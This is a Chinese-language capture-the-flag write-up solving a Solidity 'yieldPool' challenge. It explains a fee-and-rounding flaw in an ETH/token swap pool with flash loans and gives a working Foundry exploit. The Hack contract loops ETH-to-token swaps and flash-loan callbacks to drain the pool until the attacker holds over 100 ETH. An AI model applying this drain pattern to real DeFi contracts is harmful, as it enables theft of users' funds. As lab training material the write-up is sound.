## yieldPool
这是关于闪电贷的题，收取的利息是百分之一，金库里有两种代币，eth与token，两种币可以互换，并在计算换的金额时有差值，在eth转化为token时，需要我们主动转账，token转化为eth时则时被动转账

在转换时产生的差值就成为了关键，由于我们只有0.1eth，所以我们可以试着转化为token看看，我在这里纠结了一个错误很久，就是solidity的整数除法向下取整，我在想0.1都不是整数怎么输入，实际上忽略了ether是个单位 1 ether = 1*10^18，我在remix上写了个辅助函数进行计算

``` solidity
pragma solidity ^0.8.0;

contract cal{
    
    function getAmountOfTokens(uint256 _inputAmount, uint256 _inputReserve, uint256 _outputReserve)
        public
        view
        returns (uint256 c)
    {
        require(_inputReserve > 0 && _outputReserve > 0, "invalid reserves");
        uint256 inputAmountWithFee = _inputAmount * 99;
        uint256 numerator = inputAmountWithFee * _outputReserve;
        
        uint256 denominator = (_inputReserve * 100) + inputAmountWithFee;
        return numerator / denominator;
    }
    function help(uint256 a,uint256 b) public view returns(uint256 d){
        return(a-b);
    }
    //18次方
    //1000000000000000000

    // 我们账户的A
    //我们的B
    //金库的A
    //金库的B

    //只是单纯互换
    //98999901990097029  B
    //100001000000000000000000 A
    //99999901000098009902971 B
    //换回A时我们账户只有9.8010019503798842×10^16A，小于开始时10^17

    //当我们在换回A前闪电贷1ether的A试试
    // 1098999901990097029  B
    //  100001000000000000000000 A
    //99998901000098009902971 B
    //1088020902642712297 A
    //发现我们可以从中获利
```

在第一次转化时可以得到98999901990097029个Token，但是如果只是单纯地再将Token转化为eth，我们就会发现得不偿失了，所以我们可以在换回A前进行闪电贷1ether的B，在兑换为A时，我们将所有B发回兑换为A，这样我们在还款的同时获得了A，这就是攻击逻辑

### 解题
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract Hack is IERC3156FlashBorrower{

    YieldPool public yieldPool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address me;
    SecureumToken public token;

    constructor(YieldPool _yieldPool, address _add, SecureumToken  _token){
        yieldPool = _yieldPool;
        me = _add;
        token = _token;
    }

    function hack() public payable{
        while(address(this).balance < 100 ether){
            yieldPool.ethToToken{value: 0.1 ether}();
            yieldPool.flashLoan(IERC3156FlashBorrower(address(this)),address(token),1 ether,bytes(""));
        }
        payable(me).transfer(address(this).balance);
    }

    function onFlashLoan(address ,address _token,uint256 amount,uint256 fee , bytes calldata) public  returns (bytes32) {
        token.approve(address(yieldPool),type(uint256).max);
        yieldPool.tokenToEth(token.balanceOf(address(this)));


        return CALLBACK_SUCCESS;
    }


    receive() external payable {}
}
//
//  return numerator / denominator;
//  numerator = inputAmountWithFee * _outputReserve;
//  denominator = (_inputReserve * 100) + inputAmountWithFee;
//  inputAmountWithFee = _inputAmount * 99;
//  _outputReserve = tokenReserve
//  nuumerator = _inputAmount * 99 * tokenReserve
//  denominator = (_inputReserve * 100) + _inputAmount * 99;
// _inputAmount * 99 * tokenReserve / (_inputReserve * 100) + _inputAmount * 99;
// x * r < ir * 100 + x
// r < (ir * 100) / (x*99) + 1
// r < ir/x * 100/99 + 1

// function getAmountOfTokens(uint256 _inputAmount, uint256 _inputReserve, uint256 _outputReserve)
//     public
//     pure
//     returns (uint256)
// {
//     require(_inputReserve > 0 && _outputReserve > 0, "invalid reserves");
//     uint256 inputAmountWithFee = _inputAmount * 99;
//     uint256 numerator = inputAmountWithFee * _outputReserve;
//     uint256 denominator = (_inputReserve * 100) + inputAmountWithFee;
//     return numerator / denominator;
// }

// /**
//  * @dev Swap ETH to TOKEN
//  * @notice Provided ETH will be sold for TOKEN
//  */
// function ethToToken() public payable {
//     uint256 tokenReserve = getReserve();
//     uint256 tokensBought = getAmountOfTokens(msg.value, address(this).balance - msg.value, tokenReserve);

//     TOKEN.transfer(msg.sender, tokensBought);
// }



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/
        Hack hackcontract = new Hack(yieldPool,attacker,token);
        payable(hackcontract).transfer(0.1 ether);
        hackcontract.hack();
        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
```
